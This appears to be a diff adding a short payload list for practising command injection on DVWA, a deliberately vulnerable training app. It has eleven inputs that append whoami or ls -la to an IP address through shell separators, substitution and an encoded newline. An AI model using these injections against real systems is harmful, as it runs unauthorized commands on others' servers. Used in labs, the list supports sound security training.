@@ -1,0 +1,17 @@
+# Command Injection Payloads for DVWA
+
+# Low level (works)
+# Medium level (bypass with | or &)
+# High level (try newline or $())
+
+127.0.0.1; whoami
+127.0.0.1 | whoami
+127.0.0.1 & whoami
+127.0.0.1 && whoami
+127.0.0.1 || whoami
+127.0.0.1; ls -la
+127.0.0.1 | ls -la
+127.0.0.1 & ls -la
+127.0.0.1 $(whoami)
+127.0.0.1 `whoami`
+127.0.0.1%0awhoami
